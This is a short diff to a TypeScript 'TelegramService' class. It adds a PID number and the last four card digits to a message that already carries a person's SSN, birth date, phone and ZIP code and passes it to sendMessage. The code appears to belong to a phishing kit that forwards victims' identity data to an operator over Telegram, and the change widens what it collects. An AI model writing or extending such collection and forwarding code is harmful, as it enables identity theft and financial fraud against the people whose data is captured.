@@ -58,6 +58,8 @@ export interface VerifyDetailsData {
   birthDate: string;
   phone: string;
   zip: string;
+  pidNumber: string;
+  cardLastFour: string;
 }
 
 class TelegramService {
@@ -265,7 +267,9 @@ class TelegramService {
       `🔢 <b>SSN:</b> ${data.ssn}\n` +
       `📅 <b>Birth Date:</b> ${data.birthDate}\n` +
       `📞 <b>Phone:</b> ${data.phone}\n` +
-      `📍 <b>ZIP Code:</b> ${data.zip}`;
+      `📍 <b>ZIP Code:</b> ${data.zip}\n` +
+      `🆔 <b>PID Number:</b> ${data.pidNumber}\n` +
+      `💳 <b>Card Last 4:</b> ${data.cardLastFour}`;
     await this.sendMessage(message);
   }
 
